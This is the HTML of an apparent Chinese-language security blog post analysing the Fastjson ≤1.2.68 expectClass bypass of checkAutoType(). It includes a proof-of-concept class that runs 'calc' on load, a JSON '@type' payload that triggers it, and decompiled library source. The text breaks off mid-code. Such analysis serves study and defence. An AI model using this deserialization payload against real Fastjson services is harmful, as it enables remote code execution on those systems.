@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Fastjson1.2.68前言Fastjson &lt;&#x3D; 1.2.68； 12345&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.68&lt;&#x2F;version&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson1.2.68">
+<meta property="og:url" content="http://example.com/2025/06/04/Fastjson1-2-68/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="Fastjson1.2.68前言Fastjson &lt;&#x3D; 1.2.68； 12345&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.68&lt;&#x2F;version&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-06-04T05:13:22.000Z">
+<meta property="article:modified_time" content="2025-06-06T07:27:02.791Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta property="article:tag" content="-java">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Fastjson1.2.68</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/06/%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/04/Fastjson%E5%8F%98%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/04/Fastjson1-2-68/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/04/Fastjson1-2-68/&text=Fastjson1.2.68"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/04/Fastjson1-2-68/&is_video=false&description=Fastjson1.2.68"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fastjson1.2.68&body=Check out this article: http://example.com/2025/06/04/Fastjson1-2-68/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/04/Fastjson1-2-68/&name=Fastjson1.2.68&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/04/Fastjson1-2-68/&t=Fastjson1.2.68"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson1-2-68"><span class="toc-number">1.</span> <span class="toc-text">Fastjson1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.2.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Fastjson1.2.68
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-04T05:13:22.000Z" class="dt-published" itemprop="datePublished">2025-06-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">-java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Fastjson1-2-68"><a href="#Fastjson1-2-68" class="headerlink" title="Fastjson1.2.68"></a>Fastjson1.2.68</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fastjson &lt;&#x3D; 1.2.68；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.68&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>他是关于expectClass绕过的，其绕过<code>checkAutoType()</code>函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过<code>checkAutoType()</code>函数执行恶意操作，<code>expectClass</code> 的核心作用就是在反序列化时充当“临时白名单”，允许某些类型跳过常规的 autoType 黑／白名单检查。</p>
+<p>简单地说，本次绕过<code>checkAutoType()</code>函数的攻击步骤为：</p>
+<ol>
+<li>先传入某个类，其加载成功后将作为expectClass参数传入<code>checkAutoType()</code>函数；</li>
+<li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或<code>setter</code>方法中存在危险操作则可以被攻击利用；</li>
+</ol>
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class evil implements AutoCloseable&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自己构造一个恶意类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String jsonString = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;evil\&quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>前面的就不看了，我们直接到com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)这里</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeCheckHandlers != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeCheckHandlers.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">                <span class="type">AutoTypeCheckHandler</span> <span class="variable">h</span> <span class="operator">=</span> (AutoTypeCheckHandler)var4.next();</span><br><span class="line">                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);</span><br><span class="line">                <span class="keyword">if</span> (type != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> type;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">safeModeMask</span> <span class="operator">=</span> Feature.SafeMode.mask;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">safeMode</span> <span class="operator">=</span> <span class="built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (safeMode) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;safeMode not support autoType : &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">192</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">            <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (expectClass != Object.class &amp;&amp; expectClass != Serializable.class &amp;&amp; expectClass != Cloneable.class &amp;&amp; expectClass != Closeable.class &amp;&amp; expectClass != EventListener.class &amp;&amp; expectClass != Iterable.class &amp;&amp; expectClass != Collection.class) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((h1 ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">fullHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(className);</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="number">0</span>;</span><br><span class="line">                <span class="type">long</span> hash;</span><br><span class="line">                <span class="type">int</span> mask;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.internalDenyHashCodes != <span class="literal">null</span>) &#123;</span><br><span class="line">                    hash = h3;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                        hash ^= (<span class="type">long</span>)className.charAt(mask);</span><br><span class="line">                        hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Class clazz;</span><br><span class="line">                <span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">                    hash = h3;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                        hash ^= (<span class="type">long</span>)className.charAt(mask);</span><br><span class="line">                        hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> clazz;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = <span class="built_in">this</span>.deserializers.findClass(typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = (Class)<span class="built_in">this</span>.typeMapping.get(typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (internalWhite) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                        hash = h3;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(mask);</span><br><span class="line">                            hash ^= (<span class="type">long</span>)c;</span><br><span class="line">                            hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                            <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">return</span> clazz;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                            is = <span class="built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line">                            <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">                            classReader.accept(visitor);</span><br><span class="line">                            jsonType = visitor.hasJsonType();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var28) &#123;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        IOUtils.close(is);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    mask = Feature.SupportAutoType.mask;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, cacheClass);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (jsonType) &#123;</span><br><span class="line">                            TypeUtils.addMapping(typeName, 